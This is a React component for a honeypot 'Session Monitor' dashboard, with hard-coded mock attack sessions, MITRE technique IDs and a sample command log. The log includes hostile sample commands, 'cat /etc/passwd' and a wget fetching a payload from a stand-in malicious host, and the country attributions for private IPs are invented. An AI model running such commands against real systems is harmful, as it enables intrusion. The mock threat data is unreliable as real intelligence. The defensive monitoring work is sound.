import { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { useToast } from '@/hooks/use-toast';
import { 
  Terminal, 
  Globe, 
  Shield, 
  Eye, 
  Clock,
  User,
  Server,
  Activity,
  AlertCircle,
  MapPin,
  Network,
  HardDrive,
  Zap,
  TrendingUp,
  Lock,
  Download
} from 'lucide-react';

interface Session {
  id: string;
  startTime: string;
  sourceIp: string;
  protocol: string;
  status: 'active' | 'terminated' | 'suspicious';
  classification: string;
  confidence: number;
  commands: number;
  duration: string;
  honeypot: string;
  location?: {
    country: string;
    city: string;
    region: string;
  };
  port?: number;
  bytesTransferred?: number;
  packetsTransferred?: number;
  userAgent?: string;
  attackVector?: string;
  mitreTechniques?: string[];
}

interface Command {
  timestamp: string;
  command: string;
  response: string;
  classification: 'benign' | 'suspicious' | 'malicious';
}

export function SessionMonitor() {
  const { toast } = useToast();
  const [selectedSession, setSelectedSession] = useState<string | null>(null);
  
  const sessions: Session[] = [
    {
      id: 'sess_001',
      startTime: '2024-01-15T10:30:25Z',
      sourceIp: '192.168.1.100',
      protocol: 'SSH',
      status: 'active',
      classification: 'Credential Brute Force',
      confidence: 0.94,
      commands: 15,
      duration: '00:05:32',
      honeypot: 'ssh-honey-01',
      location: { country: 'Russia', city: 'Moscow', region: 'Moscow Oblast' },
      port: 22,
      bytesTransferred: 45678,
      packetsTransferred: 342,
      attackVector: 'Dictionary Attack',
      mitreTechniques: ['T1110.001', 'T1078']
    },
    {
      id: 'sess_002', 
      startTime: '2024-01-15T10:25:18Z',
      sourceIp: '10.0.0.50',
      protocol: 'HTTP',
      status: 'suspicious',
      classification: 'Web Reconnaissance',
      confidence: 0.78,
      commands: 8,
      duration: '00:02:14',
      honeypot: 'web-honey-02',
      location: { country: 'China', city: 'Beijing', region: 'Beijing' },
      port: 80,
      bytesTransferred: 12345,
      packetsTransferred: 156,
      userAgent: 'Mozilla/5.0 (compatible; Nmap Scripting Engine)',
      attackVector: 'Directory Traversal',
      mitreTechniques: ['T1190', 'T1595.002']
    },
    {
      id: 'sess_003',
      startTime: '2024-01-15T10:20:45Z',
      sourceIp: '172.16.0.25',
      protocol: 'SSH',
      status: 'terminated',
      classification: 'Advanced Persistent Threat',
      confidence: 0.97,
      commands: 23,
      duration: '00:08:41',
      honeypot: 'ssh-honey-03',
      location: { country: 'North Korea', city: 'Pyongyang', region: 'Pyongyang' },
      port: 22,
      bytesTransferred: 98765,
      packetsTransferred: 567,
      attackVector: 'Lateral Movement',
      mitreTechniques: ['T1021.004', 'T1059.004', 'T1105']
    }
  ];

  const commandHistory: Command[] = [
    {
      timestamp: '10:30:25',
      command: 'whoami',
      response: 'root',
      classification: 'suspicious'
    },
    {
      timestamp: '10:30:28',
      command: 'ls -la /',
      response: 'total 64\ndrwxr-xr-x  18 root root 4096 Jan 15 10:15 .',
      classification: 'malicious'
    },
    {
      timestamp: '10:30:32',
      command: 'cat /etc/passwd',
      response: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
      classification: 'malicious'
    },
    {
      timestamp: '10:30:35',
      command: 'wget http://malicious-site.com/payload.sh',
      response: '--2024-01-15 10:30:35--  http://malicious-site.com/payload.sh\nResolving malicious-site.com... failed: Name or service not known.',
      classification: 'malicious'
    }
  ];

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'active': return 'bg-secondary';
      case 'suspicious': return 'bg-warning';
      case 'terminated': return 'bg-muted';
      default: return 'bg-muted';
    }
  };

  const getClassificationColor = (classification: string) => {
    switch (classification) {
      case 'benign': return 'text-secondary';
      case 'suspicious': return 'text-warning';
      case 'malicious': return 'text-destructive';
      default: return 'text-muted-foreground';
    }
  };

  const exportSessionData = () => {
    const sessionReport = {
      timestamp: new Date().toISOString(),
      sessions: sessions.map(session => ({
        ...session,
        commands: commandHistory.length
      })),
      summary: {
        totalSessions: sessions.length,
        activeSessions: sessions.filter(s => s.status === 'active').length,
        suspiciousSessions: sessions.filter(s => s.status === 'suspicious').length,
        terminatedSessions: sessions.filter(s => s.status === 'terminated').length
      }
    };

    const blob = new Blob([JSON.stringify(sessionReport, null, 2)], { type: 'application/json' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `session-report-${new Date().toISOString().split('T')[0]}.json`;
    a.click();
    window.URL.revokeObjectURL(url);

    toast({
      title: "Export Successful",
      description: "Session data exported successfully",
    });
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-bold">Session Monitor</h2>
          <p className="text-muted-foreground">Real-time session tracking and analysis</p>
        </div>
        <div className="flex gap-2">
          <Button variant="outline" size="sm" onClick={exportSessionData}>
            <Download className="h-4 w-4 mr-2" />
            Export
          </Button>
          <Badge variant="outline" className="gap-1">
            <Activity className="h-3 w-3" />
            {sessions.filter(s => s.status === 'active').length} Active Sessions
          </Badge>
        </div>
      </div>

      <div className="grid gap-6 lg:grid-cols-2">
        {/* Session List */}
        <Card className="glass-effect">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Terminal className="h-5 w-5 text-primary" />
              Active Sessions
            </CardTitle>
            <CardDescription>Click on a session to view details</CardDescription>
          </CardHeader>
          <CardContent>
            <ScrollArea className="h-[500px]">
              <div className="space-y-3">
                {sessions.map((session) => (
                  <div
                    key={session.id}
                    className={`p-4 rounded-lg border cursor-pointer transition-all hover:border-primary/50 ${
                      selectedSession === session.id 
                        ? 'border-primary bg-primary/5' 
                        : 'border-border bg-card/50'
                    }`}
                    onClick={() => setSelectedSession(session.id)}
                  >
                    <div className="space-y-2">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <div className={`w-2 h-2 rounded-full ${getStatusColor(session.status)}`} />
                          <span className="font-mono text-sm">{session.sourceIp}</span>
                          <Badge variant="secondary" className="text-xs">
                            {session.protocol}
                          </Badge>
                        </div>
                        <span className="text-xs text-muted-foreground">{session.duration}</span>
                      </div>
                      
                      <div className="text-sm font-medium">{session.classification}</div>
                      
                      <div className="flex items-center justify-between text-xs text-muted-foreground">
                        <span>Confidence: {(session.confidence * 100).toFixed(0)}%</span>
                        <span>{session.commands} commands</span>
                        <span>{session.honeypot}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </ScrollArea>
          </CardContent>
        </Card>

        {/* Session Details */}
        <Card className="glass-effect">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Eye className="h-5 w-5 text-accent" />
              Session Details
            </CardTitle>
            <CardDescription>
              {selectedSession ? `Session ${selectedSession}` : 'Select a session to view details'}
            </CardDescription>
          </CardHeader>
          <CardContent>
            {selectedSession ? (
              <Tabs defaultValue="overview" className="h-[450px]">
                <TabsList className="grid w-full grid-cols-4">
                  <TabsTrigger value="overview">Overview</TabsTrigger>
                  <TabsTrigger value="commands">Commands</TabsTrigger>
                  <TabsTrigger value="network">Network</TabsTrigger>
                  <TabsTrigger value="analysis">Analysis</TabsTrigger>
                </TabsList>
                
                <TabsContent value="overview" className="mt-4">
                  <ScrollArea className="h-[380px]">
                    {(() => {
                      const session = sessions.find(s => s.id === selectedSession);
                      if (!session) return null;
                      
                      return (
                        <div className="space-y-4">
                          {/* Session Info Grid */}
                          <div className="grid gap-3 grid-cols-2">
                            <div className="p-3 rounded-lg bg-card border">
                              <div className="flex items-center gap-2 text-xs text-muted-foreground mb-1">
                                <Globe className="h-3 w-3" />
                                Source IP
                              </div>
                              <div className="font-mono text-sm font-medium">{session.sourceIp}</div>
                            </div>
                            
                            <div className="p-3 rounded-lg bg-card border">
                              <div className="flex items-center gap-2 text-xs text-muted-foreground mb-1">
                                <Server className="h-3 w-3" />
                                Protocol
                              </div>
                              <div className="text-sm font-medium">{session.protocol}:{session.port}</div>
                            </div>
                            
                            <div className="p-3 rounded-lg bg-card border">
                              <div className="flex items-center gap-2 text-xs text-muted-foreground mb-1">
                                <Clock className="h-3 w-3" />
                                Duration
                              </div>
                              <div className="text-sm font-medium">{session.duration}</div>
                            </div>
                            
                            <div className="p-3 rounded-lg bg-card border">
                              <div className="flex items-center gap-2 text-xs text-muted-foreground mb-1">
                                <Activity className="h-3 w-3" />
                                Status
                              </div>
                              <div className="flex items-center gap-2">
                                <div className={`w-2 h-2 rounded-full ${getStatusColor(session.status)}`} />
                                <span className="text-sm font-medium capitalize">{session.status}</span>
                              </div>
                            </div>
                          </div>

                          {/* Geolocation */}
                          {session.location && (
                            <div className="p-4 rounded-lg bg-muted/30 border">
                              <div className="flex items-center gap-2 mb-3">
                                <MapPin className="h-4 w-4 text-primary" />
                                <span className="font-medium">Geolocation</span>
                              </div>
                              <div className="grid gap-2 text-sm">
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">Country:</span>
                                  <span className="font-medium">{session.location.country}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">City:</span>
                                  <span className="font-medium">{session.location.city}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">Region:</span>
                                  <span className="font-medium">{session.location.region}</span>
                                </div>
                              </div>
                            </div>
                          )}

                          {/* Attack Classification */}
                          <div className="p-4 rounded-lg bg-destructive/10 border border-destructive/20">
                            <div className="flex items-center gap-2 mb-3">
                              <Shield className="h-4 w-4 text-destructive" />
                              <span className="font-medium">Attack Classification</span>
                            </div>
                            <div className="space-y-2">
                              <div className="flex justify-between text-sm">
                                <span className="text-muted-foreground">Type:</span>
                                <span className="font-medium">{session.classification}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-muted-foreground">Vector:</span>
                                <span className="font-medium">{session.attackVector}</span>
                              </div>
                              <div className="flex justify-between text-sm">
                                <span className="text-muted-foreground">Confidence:</span>
                                <span className="font-medium">{(session.confidence * 100).toFixed(1)}%</span>
                              </div>
                            </div>
                          </div>

                          {/* MITRE ATT&CK */}
                          {session.mitreTechniques && session.mitreTechniques.length > 0 && (
                            <div className="p-4 rounded-lg bg-warning/10 border border-warning/20">
                              <div className="flex items-center gap-2 mb-3">
                                <Lock className="h-4 w-4 text-warning" />
                                <span className="font-medium">MITRE ATT&CK Techniques</span>
                              </div>
                              <div className="flex flex-wrap gap-2">
                                {session.mitreTechniques.map((technique) => (
                                  <Badge key={technique} variant="outline" className="text-xs">
                                    {technique}
                                  </Badge>
                                ))}
                              </div>
                            </div>
                          )}

                          {/* User Agent */}
                          {session.userAgent && (
                            <div className="p-3 rounded-lg bg-card border">
                              <div className="flex items-center gap-2 text-xs text-muted-foreground mb-1">
                                <User className="h-3 w-3" />
                                User Agent
                              </div>
                              <div className="text-xs font-mono break-all">{session.userAgent}</div>
                            </div>
                          )}
                        </div>
                      );
                    })()}
                  </ScrollArea>
                </TabsContent>
                
                <TabsContent value="commands" className="mt-4">
                  <ScrollArea className="h-[380px]">
                    <div className="space-y-3">
                      {commandHistory.map((cmd, index) => (
                        <div key={index} className="p-3 rounded-lg bg-muted/20 font-mono text-sm">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-xs text-muted-foreground">{cmd.timestamp}</span>
                            <span className={`text-xs font-medium ${getClassificationColor(cmd.classification)}`}>
                              {cmd.classification.toUpperCase()}
                            </span>
                          </div>
                          <div className="space-y-1">
                            <div className="text-primary">$ {cmd.command}</div>
                            <div className="text-foreground/80 pl-2 border-l-2 border-muted">
                              {cmd.response}
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </ScrollArea>
                </TabsContent>

                <TabsContent value="network" className="mt-4">
                  <ScrollArea className="h-[380px]">
                    {(() => {
                      const session = sessions.find(s => s.id === selectedSession);
                      if (!session) return null;
                      
                      return (
                        <div className="space-y-4">
                          {/* Network Metrics */}
                          <div className="grid gap-3 grid-cols-2">
                            <div className="p-4 rounded-lg bg-primary/10 border border-primary/20">
                              <div className="flex items-center gap-2 text-xs text-muted-foreground mb-2">
                                <HardDrive className="h-3 w-3" />
                                Data Transferred
                              </div>
                              <div className="text-xl font-bold text-primary">
                                {((session.bytesTransferred || 0) / 1024).toFixed(2)} KB
                              </div>
                            </div>
                            
                            <div className="p-4 rounded-lg bg-secondary/10 border border-secondary/20">
                              <div className="flex items-center gap-2 text-xs text-muted-foreground mb-2">
                                <Network className="h-3 w-3" />
                                Packets
                              </div>
                              <div className="text-xl font-bold text-secondary">
                                {session.packetsTransferred || 0}
                              </div>
                            </div>
                          </div>

                          {/* Connection Details */}
                          <div className="p-4 rounded-lg bg-card border">
                            <div className="flex items-center gap-2 mb-3">
                              <Zap className="h-4 w-4 text-accent" />
                              <span className="font-medium">Connection Details</span>
                            </div>
                            <div className="space-y-2 text-sm">
                              <div className="flex justify-between">
                                <span className="text-muted-foreground">Protocol:</span>
                                <span className="font-medium font-mono">{session.protocol}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-muted-foreground">Port:</span>
                                <span className="font-medium font-mono">{session.port}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-muted-foreground">Honeypot:</span>
                                <span className="font-medium">{session.honeypot}</span>
                              </div>
                              <div className="flex justify-between">
                                <span className="text-muted-foreground">Commands Executed:</span>
                                <span className="font-medium">{session.commands}</span>
                              </div>
                            </div>
                          </div>

                          {/* Traffic Analysis */}
                          <div className="p-4 rounded-lg bg-muted/30 border">
                            <div className="flex items-center gap-2 mb-3">
                              <TrendingUp className="h-4 w-4 text-primary" />
                              <span className="font-medium">Traffic Analysis</span>
                            </div>
                            <div className="space-y-3">
                              <div>
                                <div className="flex justify-between text-xs mb-1">
                                  <span className="text-muted-foreground">Avg. Packet Size</span>
                                  <span className="font-medium">
                                    {((session.bytesTransferred || 0) / (session.packetsTransferred || 1)).toFixed(0)} bytes
                                  </span>
                                </div>
                              </div>
                              <div>
                                <div className="flex justify-between text-xs mb-1">
                                  <span className="text-muted-foreground">Session Rate</span>
                                  <span className="font-medium">
                                    {(session.commands / parseInt(session.duration.split(':')[1] || '1')).toFixed(2)} cmd/min
                                  </span>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      );
                    })()}
                  </ScrollArea>
                </TabsContent>
                
                <TabsContent value="analysis" className="mt-4">
                  <ScrollArea className="h-[380px]">
                    <div className="space-y-4">
                      <div className="grid gap-4 grid-cols-2">
                        <div className="p-3 rounded-lg bg-primary/10 border border-primary/20">
                          <div className="text-xs text-muted-foreground">Risk Score</div>
                          <div className="text-xl font-bold text-primary">0.94</div>
                        </div>
                        <div className="p-3 rounded-lg bg-destructive/10 border border-destructive/20">
                          <div className="text-xs text-muted-foreground">Threat Level</div>
                          <div className="text-xl font-bold text-destructive">HIGH</div>
                        </div>
                      </div>
                      
                      <div className="space-y-3">
                        <div className="text-sm font-medium">AI Indicators</div>
                        <div className="space-y-2">
                          <div className="flex items-center gap-2 text-sm">
                            <AlertCircle className="h-4 w-4 text-destructive" />
                            <span>Suspicious command patterns detected</span>
                          </div>
                          <div className="flex items-center gap-2 text-sm">
                            <AlertCircle className="h-4 w-4 text-warning" />
                            <span>Credential enumeration attempts</span>
                          </div>
                          <div className="flex items-center gap-2 text-sm">
                            <AlertCircle className="h-4 w-4 text-destructive" />
                            <span>Malware download attempted</span>
                          </div>
                          <div className="flex items-center gap-2 text-sm">
                            <AlertCircle className="h-4 w-4 text-warning" />
                            <span>Known APT group signature match</span>
                          </div>
                        </div>
                      </div>

                      {/* Behavioral Analysis */}
                      <div className="p-4 rounded-lg bg-accent/10 border border-accent/20">
                        <div className="font-medium mb-3">Behavioral Analysis</div>
                        <div className="space-y-2 text-sm">
                          <div>• Rapid successive authentication attempts</div>
                          <div>• System reconnaissance commands</div>
                          <div>• Privilege escalation indicators</div>
                          <div>• Data exfiltration patterns</div>
                        </div>
                      </div>

                      {/* Recommended Actions */}
                      <div className="p-4 rounded-lg bg-warning/10 border border-warning/20">
                        <div className="font-medium mb-3">Recommended Actions</div>
                        <div className="space-y-2 text-sm">
                          <div>1. Block source IP at firewall level</div>
                          <div>2. Update threat intelligence feeds</div>
                          <div>3. Review access logs for similar patterns</div>
                          <div>4. Alert security operations center</div>
                        </div>
                      </div>
                    </div>
                  </ScrollArea>
                </TabsContent>
              </Tabs>
            ) : (
              <div className="flex items-center justify-center h-[450px] text-muted-foreground">
                <div className="text-center">
                  <Terminal className="h-12 w-12 mx-auto mb-4 opacity-50" />
                  <p>Select a session to view detailed information</p>
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}